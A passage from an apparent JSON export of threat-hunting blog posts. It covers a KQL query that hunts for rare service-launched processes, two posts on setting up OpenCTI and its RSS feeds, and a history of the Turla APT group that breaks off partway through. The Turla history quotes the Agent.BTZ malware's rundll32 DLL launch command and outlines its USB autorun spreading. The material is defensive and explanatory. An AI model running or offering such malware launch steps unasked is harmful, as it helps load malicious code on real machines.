ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName);The next part of the query calculates how many times each process on each of the endpoints have been launched as a child of services. exe. The data is then joined back to the original results from the query. | join kind = leftouter (DeviceNetworkEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, NetworkAction = ActionType, RemoteIP, RemoteUrl) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1| join kind = leftouter (DeviceFileEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, FileAction = ActionType, ModifiedFile = FileName, ModifiedFileSHA1 = SHA1, ModifiedFilePath = FolderPath) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1| join kind = leftouter (DeviceImageLoadEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, LoadedDLL = FileName, LoadedDLLSHA1 = SHA1, LoadedDLLPath = FolderPath) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1The last part of the query uses summarize and make_set function to gather information from all the tables to a single line on the resulted table. This makes analysis of each of the results much easier. I did not add all the projected fields to the final part, but they are easily added if needed. It just makes the output potentially hard to understand. | summarize ConnectedAddresses = make_set(RemoteIP), ConnectedUrls = make_set(RemoteUrl), FilesModified = make_set(ModifiedFile),FileModFolderPath = make_set(ModifiedFilePath),FileModHA1s = make_set(ModifiedFileSHA1), ChildProcesses = make_set(StartedChildProcess), ChildCommandlines = make_set(StartedChildProcessCmdline), DLLsLoaded = make_set(LoadedDLL), DLLSHA1 = make_set(LoadedDLLSHA1) by DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1The final output should be something like this: Example of the output. The complete query: The idea of this query is to look for rarely seen processes which are launched as a service. This query will not likely hit a persistent malware being launched daily basis as a service, rather it hits the occurrences where Windows services are being used to launch malicious code. Cobalt Strike is one example of where the code is often being launched as a service and the service is removed after. The query then gathers more information of the process and shows the results in a single line, to make analysis a little bit easier. A lot of tinkering may be needed for each of the individual environments. With this amount of joins it will be quite heavy to run and also it can provide way too many results. The count can be lowered to find those real anomalies. The beauty of the query in my opinion is in the collection of activities to a single line. The same approach is applicable on different situations which can prove a lot of value for the actual analysis of the data. This way it makes it easier to identify the potentially malicious instances from something legitimate with a quick glance. That’s it for now! Here is the final query, with Git links in the bottom. let LookupTime = 30d;let WhiteList = pack_array( svchost. exe , mssense. exe , msmpeng. exe , searchindexer. exe , microsoftedgeupdate. exe );let GetServices = materialize (DeviceProcessEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, StartedChildProcess = FileName, StartedChildProcessSHA1 = SHA1, StartedChildProcessCmdline = ProcessCommandLine, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName);GetServices| summarize count() by ServiceProcess, DeviceName| where count_ &lt; 6 | join kind = inner GetServices on ServiceProcess, DeviceName | join kind = leftouter ( DeviceNetworkEvents | where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, NetworkAction = ActionType, RemoteIP, RemoteUrl) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1| join kind = leftouter (DeviceFileEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, FileAction = ActionType, ModifiedFile = FileName, ModifiedFileSHA1 = SHA1, ModifiedFilePath = FolderPath) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1| join kind = leftouter (DeviceImageLoadEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, ServiceProcessCmdline = InitiatingProcessCommandLine, ServiceProcessID = InitiatingProcessId, ServiceProcessCreationTime = InitiatingProcessCreationTime, ServiceProcessUser = InitiatingProcessAccountName, LoadedDLL = FileName, LoadedDLLSHA1 = SHA1, LoadedDLLPath = FolderPath) on DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1| summarize ConnectedAddresses = make_set(RemoteIP), ConnectedUrls = make_set(RemoteUrl), FilesModified = make_set(ModifiedFile),FileModFolderPath = make_set(ModifiedFilePath),FileModHA1s = make_set(ModifiedFileSHA1), ChildProcesses = make_set(StartedChildProcess), ChildCommandlines = make_set(StartedChildProcessCmdline), DLLsLoaded = make_set(LoadedDLL), DLLSHA1 = make_set(LoadedDLLSHA1) by DeviceName, ServiceProcess, ServiceProcessCmdline, ServiceProcessCreationTime, ServiceProcessID, ServiceProcessUser, ServiceProcessSHA1PR to MS hunting repo. My Git page storing the query. "
    }, {
    "id": 27,
    "url": "https://threathunt.blog/opencti-rss-feed-support/",
    "title": "OpenCTI RSS feed support",
    "body": "2023/09/16 - RSS feed support in OpenCTII haven’t been playing with the OpenCTI platform a lot since I first deployed it. I have a look at the data from time to time but haven’t had the time to create integrations. I just got back to this and started to look if the RSS feed ingestion has been added to the platform and it indeed seems to be the case. The RSS reader feature was added in 5. 10. 0 release which was released on 27. 8. 2023.  I updated the docker-compose. yml file to include the latest versions and pulled the images. After that the RSS feed ingestion magically appeared! Then it is more or less about adding those RSS feeds and to see how that looks like. I’ll start with Bleeping Computer. The integration is super easy and does not really require any sort of instructions on how to do it. You mostly just need the feed address, name and not much else. I decided to create new users for all the feeds though to keep it clear which feed comes where. Not sure if it is really required though. When the feed has been created it needs to be started. I started the integration and it seems that nothing is happening and nothing is actually being ingested to the system which is a little weird. I created a second one for The DFIR report. That didn’t work either, but then I realized that the account responsible for the feeds probably needs more permissions. I added the account(s) to the Connectors group after which I updated the feeds an The DFIR Report was immediately working. Same cannot be said of the Bleeping Computer feed though. I proceeded to recreate it and now we are talking - the import started. I added some of the RSS feeds I am using and it looked like this: I had added some of my favorite feeds. Here is a list of the feeds which I added in no particular order. Name URL Trend Micro Research, News, Perspectiveshttp://feeds. trendmicro. com/Anti-MalwareBlog/ Trend Micro Research, News and Perspectiveshttp://feeds. trendmicro. com/TrendMicroSimplySecurity The Register – Securityhttp://www. theregister. co. uk/security/headlines. atom The Hacker Newshttp://thehackernews. com/feeds/posts/default The DFIR Reporthttps://thedfirreport. com/feed/ SecurityWeekhttp://feeds. feedburner. com/Securityweek Security Affairshttp://securityaffairs. co/wordpress/feed Securelisthttps://securelist. com/feed/ SANS Bloghttps://blogs. sans. org/computer-forensics/feed/ Palo Alto Networks Bloghttp://researchcenter. paloaltonetworks. com/feed/ Packet Storm Securityhttp://packetstormsecurity. org/headlines. xml Microsoft Security Response Centerhttp://blogs. technet. com/msrc/rss. xml Microsoft Security Bloghttp://blogs. technet. com/mmpc/rss. xml Malwarebytes Labshttp://blog. malwarebytes. org/feed/ Lenny Zeltserhttp://blog. zeltser. com/rss Krebs on Securityhttp://krebsonsecurity. com/feed/ Hexacornhttp://www. hexacorn. com/blog/feed/ Hackread – Latest Cybersecurity News, Press Releases &amp; Technology Todayhttp://feeds. feedburner. com/hackread Darknet – Hacking Tools, Hacker News &amp; Cyber Securityhttp://feeds. feedburner. com/darknethackers Dark Readinghttp://www. darkreading. com/rss/all. xml Cisco Talos Bloghttp://vrt-sourcefire. blogspot. com/feeds/posts/default CISA Cybersecurity Advisorieshttps://www. us-cert. gov/ncas/alerts. xml Bleeping computerhttp://www. bleepingcomputer. com/feed/ Okay you have feeds. . what now?: Not much I guess. It is just a simple RSS reader. It would be cool if it would go through the article and add IOCs and all that but it does not. However, this can be useful if you are collecting this information centrally for your team to use. Then the same platform can be used to do further digging, linking between of the items. Someone could for example find an interesting article and then turn that into a Threat Hunt which could then be documented in the OpenCTI platform. If you have a CTI team they can go through the same material and use status so that the others know who have gone through what. It is just more information in the central platform to help the security operations. Also, you are not relying on a single individual following the right feeds - you can integrate what you would like all the people to follow. I am sure that there are plenty of use cases for this sort of functionality which I can’t think of. What I do know is that this was one of the features which I really missed when I was looking into the platform and I am glad to see that it has been implemented! Here is an example of what the ingested report looks like in the platform: So it does add the labels which is great. It is a great feature to bring more data to the platform in an easy manner. By all means it is not the most sophisticated way of bringing in the data - if comparing to the AlienVault integration it is is much less elaborate, however it is easy to and nice addition. I do have some further use cases for the platform which I will likely blog about on a later date. It will be more about integrating the data from the platform to other security tools to automate certain capabilities. A little shorter post this time - thanks for reading! "
    }, {
    "id": 28,
    "url": "https://threathunt.blog/threat-intelligence-platform-opencti/",
    "title": "Threat Intelligence Platform - OpenCTI",
    "body": "2023/07/06 - What?I’ve been thinking of implementing some sort of Threat Intelligence Platform for my personal usage. The original idea has been to run MISP as it is quite well known to be very good at this sort of thing, however I’ve been hearing a lot of good things about OpenCTI lately. It is by far less mature and less used than MISP, so it is likely to be less polished at this stage. It offers, however, good amounts of eye candy and seems to be a cool platform. Another option would be YETI, butI didn’t really even have a look at it.  Why?This is a much better question. I like to keep up with the current threat activity and I have been doing that mostly by following RSS feeds. I have been toying with the idea of having CTI platform to see if I can use it for the same purpose with more information readily available. Additionally, I like to learn. I have not been super into TI but have had a raising interest towards the subject. I’d like to understand better how the platform(s) function and what I can do with them. Ultimately though, I think that the Threat Intelligence Platform is just that - a platform to ingest your threat intelligence. I most likely will not have access to any of the cool data sources, relying on open source which might mean that the feeds are just so late that they provide no use to me. Or maybe they are only providing IoCs and no real intel which can be great for security operations, but of limited use for an individual. It might be actually faster to just keep on reading those news throughout RSS feeds. One option would be to integrate the RSS feeds to the CTI platform which can be done (at least with MISP) but if it is all about the RSS feeds why bother. I can keep up to them with the current solution. In the end it is still quite possible that this will prove to be pointless exercise but we shall see. InstallationI will be installing the OpenCTI to my good ol’ unraid box as a docker. Docker because of simplicity and my ever increasing love towards the product. There are instructions available on the OpenCTI documentation on how to handle the installation. There wasn’t much issues with the installation with the docker approach. And in couple of minutes we have it. A clean CTI platform.   There we have it. A clean OpenCTI. Now the real work begins. So what to actually integrate to the product? What can I even integrate and does it make any sense? IntegrationsTo get started I clicked through the GUI and noticed the lack of creating integrations there. I did find a link to this page. So there we have a list of different CTI sources I guess and we can filter down to the community editions. They have been categorized to different categories:  OpenCTI Live Streams TAXII Collections Connectors - Data Import Connectors - Enrichment Stream Consumers Files Import Files export Third-party native integrationsSome of these were more clear than the others. The OpenCTI Live Streams and TAXII collections had only three additions in total so it seemed to be quite lackluster. Under the Data Import and Enrichment there are a good few though, even on the community edition front. List of the community connectors. Some of these are more interesting than others.   Apparently most of these have a ready made docker images which I need to run and this was the point where I decided to create a dedicated VM for the OpenCTI. The Unraid container management isn’t really that amazing so this decision made it easier for me to have all the relevant containers categorized to a single VM. I know, it is not very optimal solution. I sort of love the approach. I like tinkering with docker and this approach might actually make it easier for me to build my own integrations too as there are plenty of examples. Anyway, many of the feeds still do require a paid access so even if the connectors are community editions the actual feeds are not. For example, the Valhalla feed can be acquired only through a paid subscription - so actually it seems that the community support feeds are more or less created by community but they do not mean that the content would be free. Later to be examined if the “partner and filigran support” connectors actually are free or not. The IOC feeds are not really my top interest as I don’t really have anything to do with those, unless there would be metadata included. Most of the feeds seem to be all about IOCs so not sure if this actually will work out or not for my purposes. Nevertheless I decided to start integrating a little bit randomly. The more the better am-I-right? (No, not really). AlienVault: The configuration of the connector is super easy. All the things you need are basically the OpenCTI API key, OpenCTI address (remember to add the IP + port) and then add your own API key from AlienVault. All the changes are made to the docker-compose. yml file and the container can be then started with docker-compose. It is pulling the image from the Docker Hub so even though the source code and docker image are included in GitHub they are not really used here. This is good news as then I can most likely consolidate all the connectors as a single docker-compose file, which I like. They could be added to the docker-compose file launching the actual OpenCTI as well, but I am keeping that clean from the actual connectors. The AlienVault connector is importing pulses. This can take a while. Now that the AlienVault connector has been built I am eagerly waiting for the ingestion to finish and to see what kind of data there will be present on the OpenCTI platform. I am especially interested to see how the data is being structured on the platform. It seems that the connector is crashing though. I didn’t fancy much debugging so I just stopped it and changed to initial date to the start of 2023. Maybe it could be related to API timeouts.   This didn’t fix it. I looked at the errors and got very generic “Errorno 3 - try again” type of error. No luck on Github either. However, it was stated that all the connectors need access to Rabbitmq hosted as part of the OpenCTI platform. So I exposed the ports of the Rabbitmq container and this didn’t do anything. Annoyingly, the Malware Bazaar connector worked fine so this was a bit of a mystery.   Just for sake of debugging I added the configuration as part of the base OpenCTI docker-compose. yml configuration as additional container. This seemed to do the trick. It started working after this. Maybe access to the RabbitMQ wasn’t working nicely after all. The likely reason is that my limited docker skills were limiting the RabbitMQ to not to be available to the other containers. Could also be my lazyness to reboot the secondary containers after making the original changes. Nevertheless, I decided to go with this as it worked now. The dashboard after adding some data. The dashboard is a lot cooler now. The data ingestion seems to take some time though, likely cause it is being parsed and then ingested to elasticsearch.   The analysis reports, IoCs, Threats, Vulnerabilities etc are starting to flow in from the AlienVault feeds. Example Analysis Report ingested from AlienVault. I think this is cool with all the relations. Actually I think it is really cool and love the GUI and the possibilities so far. The views to the data and the correlation between of it is quite nice. Further integrations: I noted that making the platform usable for me it likely requires quite a lot of additional custom connectors. Before going to that route I continued to explore some of the ready made connectors. While enabling stuff I stumbled across something called Obstracts Connector. This seemed very cool, you could intake RSS feeds with the Obstracts service and then use the connector to ingest them to OpenCTI through an API. Unfortunately the API enabled access costs a bit much so this wasn’t really an option. I did enable the following though in addition to AlienVault:  OpenCTI Datasets - These are more or less datasets feeded to the platform. Includes basic information like industry sectors.  OpenCTI Mitre - Same with this one, imports basic information from Mitre ATT&amp;CK.  CISA known exploited vulnerabilities - This is cool and the name tells it all.  NVD Common Vulnerabilities and Exposures  - Love those vulns.  Malpedia - IOCs etc. Unfortunately I don’t have an account so only TLP:WHITE stuff.  Maltiverse - IOCs etc. free tier, not sure if this will be at all useful.  Abuse. ch Threat Fox - IOCs.  Abuse. ch UrlHaus - URL IOCs. Maybe later:  TweetFeed - this is interesting and new to me. Gathers IoCs from tweets.  TAXII2 - generic Taxii2 collector.  UrlscanI am assuming that for my general interest the AlienVault, NVD CVE and the CISA known exploited vulnerabilities would bring most value. The IOC bases feeds are a little meh unless you can technically integrate your CTI platform to technical solutions. However, there is some potential in delivering malware statistics from the feeds which I find interesting. You know, I did build ELK based solution for those purposes before and it is still running. Maybe I can retire that thing if the OpenCTI works well. The lack of the threat intelligence reports is a bit annoying. AlienVault is offering them but that is pretty much it from the sources integrated. Rest are either supportive or offering more technical IOCs. Pulsedive is offering very interesting free CTI. I’ve been using it before for some of my projects. Unfortunately there is no ready made connector created for Pulsedive. There are couple of options how this can be one but unfortunately most if not all of them require the paid PRO license. The price for the pro license when not used for commercial purposes is quite cheap, 29€ a month. I don’t know though what would be included in the data. Still the connectors needs to be built as there is no ready made option. At this stage it seems that the further integrations needs a lot of tinkering. I am very interested in turning RSS feeds to reports in OpenCTI and make cool reports about them automatically. However as this requires a lot of time to do I will explore that option at a later date. There is a development guide available for creating the connectors, here. Current connectors. Oh and the last thing before moving on - this thing is quite memory hungry. I gave the VM 8 gigs of memory and it ate it all up and is having some hiccups within the gui likely because all the memory is consumed. I’ll up that to 12GB and will see if that is enough. Enrichment integrationsThen to the enrichment. These can be used to, well, enrich the data. There are quite a few options offered out of the box. This is cool for any production CTI platform, however for my purposes the enrichment is less relevant most of the time. More out of interest of testing this stuff out I decided to give it a go with couple of integrations. I started with the following:  Hatching Triage Crowdsec Shodan InternetDBI opted for the Shodan InternetDB instead of the normal Shodan just so that I don’t accidentally use my limited Shodan quota which I might need for other purposes. [caption id=”attachment_434” align=”aligncenter” width=”821”] Shodan InternetDB Enrichment on-going. [/caption] This is quite cool in my opinion. The CrowdSec integration seems to not work though, error given about the usage of v1 API. The Hatching Triage Sandbox is working and is enriching the artifacts nicely when they are sent to the sandbox.   When the Hatching Triage enrichment is used the analysis results are added as comments to the artifacts. The relations are also added to other relevant techniques. This I appreciate a lot and find to be really cool. It seems to work nicely too. Example of the Hatching Triage enriching an artifact. Exploring more enriching integrations I decided to go with VirusTotal and Sophos. The Sophos Intelix offers a good quota even for a free tier account. The only annoying thing about that is the need for an AWS account. Even though the SophosLabs Intelix has a very high requests on free tier, I still didn’t enable the automatic enrichment as I don’t want to end up with any surprises. I did also add a “Zero-Spend” budget to AWS so if there would be money spent on AWS it hopefully alerts me. I wish this could be limited in a way which allows you to not go above certain threshold and would just suspend all the things that cost money at that point.   Anyway, this enabled me to add the Sophos support and I also added the two VirusTotal connectors too even if the API is limited on free tier. Unfortunately it seems that the VirusTotal integration is currently completely broken. There is a PR for a simple fix but the docker-compose file was set to use a certain image version. I changed it to the latest. Didn’t fix it as the 5. 8. 7 was already latest, changed it to rolling. It works! The Sophos connector isn’t working either but it might be in a beta or something. No luck with this one though, there wasn’t an easy fix and I didn’t feel like debugging much currently. Using the platformThere are plenty of use cases for such a platform from integrating to SIEMs and other security tools for automated ingestion of IOCs, blocking, allowing, analyzing threats, analyzing IOCs and many others. I am no pro on the platforms themselves and I build it to get more information of the current threats that the organizations could be facing. For this use case I face the issue of having too little data when I am trusting the free sources. There is plenty of technical IOC data which can be acquired from the free sources but the actual meaningful reports there are less of. Though I have to add that the IOCs might not be the best either. I am sure that many security vendors whom gather their own IOCs are better and the platform(s) need ingestion by the SOC to be useful. I would really like to have data added from blog posts, news articles and similar sources correlated to the mentioned threat actors, malware, techniques and all that fun stuff. AlienVault data is great for the purposes but it is just a single source. The other free sources do not really seem to help in this, unfortunately. So to the actual usage. The first thing is that I want to look at are any recent reports. These are listed under the Analysis -&gt; Reports section of the tool. The reports view. I drilled down to a single randomly chosen report to see how that looks like. There was one picture of this view before but hey, have another! General view of a report. This is quite generic view of the report so you can decide if you are interested of knowing more. There are usually additional links to external sources about articles from which you can find more information. Also, there is additional information in the others tabs, looking at the Knowledge tab next: The Knowledge tab from a report. This is a cool looking graph which you can interact with. It shows the relation of the observables and entities. I have seen similar graphs many times before but the actual usage for this has been quite limited in my experience. This is one of the best usages for this sort of visualizations that I have seen though, you can easily see the relations between of for example one IOC and techniques. Looking into other tabs you have entities and observables. There also is a Content tab which have been so far always empty  and Data which also have been empty. The entities and observables shown on the image. These are cool. You get more information of what kind of techniques have been observed to be used in this particular attack and the actual indicators matched to it. When you are looking for high level information this might not be that interesting but it could be then hunted for easily within your chosen technical solution. Of course when jumping to TTP based threat hunting you need to analyze the articles a little more. One good addition is the enrichment. If you want to have more information from a file you could enrich it with other integrations. Let’s take one of the hashes as an example.  VirusTotal enriched sample on the right side. The full JSON output from VT API is available as a comment too if needed. Also link to VT is added as external reference. This is nice data. It could also be enriched automatically in production if need be which would then add good amount of labels. These are great when looking for  information. Unfortunately, I don’t have a license which would allow me to download the sample from the VT api. This would turn this as artifacts which could be analyzed in a sandbox. This could reveal cool TTPs of the malware used and then could be used in more general way to conduct threat hunting. In enterprise environment this would likely be possible. In this particular example the original report proves some information which could be turned to hunting queries:  The malware is using double extensions - . xls. exe and . pdf. exe.  The malware is stated to run discovery commands and establishing a C2 connection.  Custom web request header: Cookie: 3rd_eye=[client_hash value] Investigating a particular threat: Another use case which interests me is to investigate a particular threat. Let’s take Qbot as an example. Running a query for qakbot results in 13 results from which the first one is the QakBot malware page. This page should at least in theory contain all the other information to which the previous search resulted in. The page contains information of the QakBot malware although the main page is mostly just general information and statistics. Qakbot general page. The Knowledge page contains quite some information of the qakbot. It contains an overview of the data, information about the victims if available, vulnerabilities observed to be linked to qakbot, mitre att&amp;ck graph of the techniques used by it, observables and a lot of other information. Not all of this is present for all the threats and especially as the data sources in my implementation are limited there is only so much data. There is a ton of observables available though. In total there are 3. 83k observables found related to Qakbot. I don’t know how these are mapped but my guess would be that by the label used. Could be something more fancy but I am a bit too lazy to find that information out, sorry. Combination of some of the views under the Knowledge tab. The Analysis tab contains the reports about Qakbot. These include different kind of articles/reports where the qakbot has been discussed in one way or another. This can be a goldmine of information when creating detection capabilities or threat hunting queries against something. Of course you still need to analyze the articles but if you have great data sources maybe you can at least have a single place from where to investigate. The Indicators tab contains, well, indicators. My understanding is that these are more the IOCs as observables are sort of “unverified IOCs”. So the Indicators are less FP prone. Could be wrong though. This is it for this example. ConclusionThe OpenCTI platform seems to be very cool CTI platform. It has a great and beautiful GUI which works very well (after you give it enough memory to run). The links between of different objects is great and ingesting at least some of the data is made quite easy. I like the idea of connectors, just wish that there were a fair bit more of those available. For my usage this would be a great platform if I could ingest more of the reports. That is the biggest issue which I have with it currently for my own personal purposes. I would love to have more information ingested to the product. When it comes to actual usage of the tool I think it can be very nice addition to an organization. Maybe you are looking for a platform to store Cyber Threat Intelligence and don’t want to pay the huge price for a commercial solution. Maybe you could use the money to ingest some of the commercial feeds to the platform instead of paying for the actual platform itself. For that purpose I think this is very very nice - easy to use - easy to understand and easy to look information from. You can easily add your own data through the GUI. If you would have an incident you could store information relating to that particular incident in the tool. You can add a lot of information which is then searchable later on. I think this can be a good solution for at least a smaller organization. Although if looking for open source CTI platform I think MISP is still the first option unless it would be somehow proven to be worse. It is a lot more complicated though but also offers a lot more options out of the box. For a lazy person like me, I think the OpenCTI could be the better option (unless I really can’t get RSS feeds into the thing). What about the criticism then? Well it is quite poorly documented. The documentation could be improved on many levels, actually on almost all the levels. The deployment guide works relatively well but even there are little things which could be improved. The integrations and the functions of different connectors are not documented mostly at all. If they are documented the documentation is all over the place. There should be clear labeling of what you can achieve with each of the things. Some documentation is still completely missing, only referring that it will be there sometime in the future. Then there is only limited amount of said connectors. Many useful things are missing from the connectors but of course you can develop your own. It doesn’t seem to be that simple task though. I think having the RSS feeds ingested should be quite easy to do and for this kind of tool it would add huge value, especially for the smaller teams which might not have the budget for those cool commercial feeds.   I will most likely continue blogging about the platform later on as I am hoping to add more stuff to it and gather more experience using it. Thanks for reading! "
    }, {
    "id": 29,
    "url": "https://threathunt.blog/Turla/",
    "title": "Turla",
    "body": "2023/05/19 - Why Turla?Lately I’ve done quite a lot of write-ups of testing currently active malware and how that could be potentially hunted for. I’d rather write about something else for a change, which led me to this topic. Turla has been in the news lately as their long running malware known as Snake was - well - dismantled by the US government. Turla was also raised to the news where I live which further raised my interest towards the group. Supo, which is Finnish Security and Intelligence Service, stated in the l0cal news that Turla has been active within Finland for years now. What is Turla?This is how I picture Turla. Turla is a Russian threat actor and an Advanced Persistent Threat (APT) group. The group has been operating for a long time and has been active at least since 2004 - but likely even longer than that. It is known with multiple other names as well, as is the custom with the APT groups. Some of the other names for the group include Venomous Bear, Uroburos and sometimes the group has also been called Snake. According to multiple articles they have been targeting more than 45 different countries and industries. As they are not a financially motivated actor their targets seem to be limited to industries which can hinder the governments ability to act or which can give valuable information to the Russian government. The group is sponsored by the Russian Federal Security Service, FSB. Turla is known of using their own in house malware and utilizing a lot of watering hole an spear phishing attacks for gaining the initial access towards the victim organization. Some of their own malware include the Snake/Uroburos and TinyTurla. The first big thing I found by the Turla group was a malware known as Agent. BTZ which was discovered at 2008. This was a massive finding back in the 2008 and really made the Turla group known. However, while doing my research the first mentions I could find from the Turla group were from the year 1996. It is good to note that Turla is also a name of one of the malware which the group has developed. I am mostly referring to the group itself when using the term Turla within this blog post. The diagram showing the activity which I will be describing in more detail in the upcoming part. 1996 - Moonlight MazeWhile looking for information about Turla I came across articles about “Moonlight Maze”. It is one of the first cyber espionage groups which have been actively investigated by a group of researchers. Many of the researchers from different countries have found out that it is likely that the Moonlight Maze authors are the same as with Turla. It is highly likely that the Moonlight Maze is the earliest malware written by the Turla group. As Moonlight Maze was active in the 1990s it means that Turla has been active at least for 25+ years - just wow. Moonlight Maze was very advanced at the time, using multiple proxy servers to cover their tracks. The logs had survived from one of the attacks and have been analyzed by a team of researchers. These logs revealed that the group was using a backdoor built on the basis of LOKI2 tool. Similarly, Turla has been using backdoors built on the basis of the same tool later on.  Loki2 is a backdoor which was published on a Phrack Magazine in 1997. Rather interestingly, it works  over ICMP which can make it effective even in 2020s. Quite often the defenders are focusing more on TCP/UDP which could mean that ICMP based communication is missed. It is still being used by some of the threat actors, although highly modified from the original. Moonlight Maze was targeting the US military and government agencies. The group was targeting Solaris/*nix based system which is quite fascinating as nowadays the *nix platform is a rarer target for the threat actors. Initial access to the target systems were gained by exploiting a vulnerability on a web server, which was very easy to exploit. Basically, the threat actor could print out the *nix password file, gaining access through telnet with the legitimate credentials. Especially as the security monitoring capabilities in 1996 were in early stages these kind of attacks could easily go unnoticed. Not saying though that they wouldn’t now - I have been investigating plenty of cases where unauthenticated remote code execution vulnerabilities were used to gain access to a network. After gaining access the group ran different tools to laterally move within the network and to steal information from the target devices. There is hugely interesting write-up available here if you’d like to learn more, especially about how the researchers were attributing MM to Turla. The next big thing where Turla has been attributed as the threat actor happened in 2008. 2008 - Agent. BTZIn 2008, the Turla group used a malware known as Agent. BTZ to breach the US military computers. The malware was deployed on an infected USB drive to an army base, located in middle east. It is said that the threat actor left the infected USB drive to a parking lot of an army base after which it was connected to a laptop, however this story has not been verified of being true. Agent. BTZ was self-replicating and was able to spread overseas to the US, including the Department of Defense devices.    This is quite interesting to me as just as late a in 2022 many companies were dealing with Raspberry Robin. This malware was similar to the Agent. BTZ infecting computers through infected USB drives. Both were also capable of infecting other drives connected to an infected device. It is quite interesting that similar tactics seem to work for the threat actors even 15 years later. The Agent. BTZ was able to steal information and give a remote access channel to the Turla group. The old tricks have not changed much as the information stealer type of malware is currently by far the most popular malware-family, according to sandbox statistics. Interestingly the attack led the DOD to ban the USB drive usage - which was hindering the US army operations as the personnel were used to using USB drives to store information. Cleaning the infection took more than a year and even after that the officials were unsure if they were unable to clean all the infections. The military networks were clean, however it was noted that the DOD networks might still have infected machines in them, after more than a year of the initial infection. Agent. BTZ was capable of infecting all the removable drives which were connected to an infected device. This was done by copying a malicious autorun. inf file to the drive with instructions to launch the file. When the drive would be connected to a clean device it would automatically run the malicious code. This attack vector has been fixed in Windows years ago but rather interestingly the malicious payload was launched by running the following command: rundll32. exe . \\[random_name]. dll,InstallM. This to me personally is very interesting as I have been hunting for malicious code being loaded by rundll32. exe for years now. It seems that this technique is very old, having been active for at least 15 years. The difference is that back then it was utilized by the highly skilled APT groups, now it can be utilized by all the bad actors. The malware would then download a malicious DLL image file which would be loaded and malicious remote thread would be created to the Internet Explorer process. This was done to bypass potential firewalls. A very good write-up is available here. 2013 - Breach of the Ministry of Foreign Affairs in FinlandThe activity in 2013 was very interesting to us Finns. It was reported in the local MTV news that the Ministry for Foreign Affairs have been compromised. It is possible that the threat actor have been inside the network for as long as 4 years. It is good to note that the attack potentially allowed for the threat actor to gain access to the European Union data using the servers located in Finland. The Finnish officials got a tip from the overseas of the potential compromise. When the investigation started it was discovered that the malware used was potentially Red October. However, later it was stated that Red October was found from a single device but it was not the main tactic used by the threat actor. Unfortunately, I was not able to find much more details of the case.  One of the reasons why the Red October has been associated to Turla group is that it shares a lot of similarities to Agent. BTZ. Both of the malware have similarities to the Turla malware which is used by the threat actor later on. It is likely that the Agent. BTZ was the starting point, after which the Red October was developed which led to the development of Turla malware. The Red October malware was mainly trying to steal information of the target network, fitting the cyber espionage scheme very well. Red October had more than 60 C&amp;C domains and they started to shutdown the C2 infrastructure after the Red October malware was discovered. Epic Turla: The second major activity in 2013 was the operation “Epic Turla”. Kaspersky wrote an article about Epic Turla 